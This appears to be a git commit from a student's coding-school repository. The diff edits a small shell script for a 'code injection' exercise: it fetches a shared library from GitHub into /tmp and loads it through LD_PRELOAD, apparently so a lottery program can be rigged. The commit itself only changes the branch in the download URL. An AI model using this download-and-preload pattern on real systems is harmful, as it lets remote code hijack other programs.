f0482c92a0b56154453d4ad9e04630f61ff84c22
edwindevs <edmbogo@outlook.com>
2022-07-15 23:49:58 +0000

    Task 3. 3. Code injection: Win the Giga Millions!

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/edwindevs/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libtest.so
+wget -P /tmp https://github.com/edwindevs/alx-low_level_programming/raw/main/0x18-dynamic_libraries/libtest.so
 export LD_PRELOAD=/tmp/libtest.so
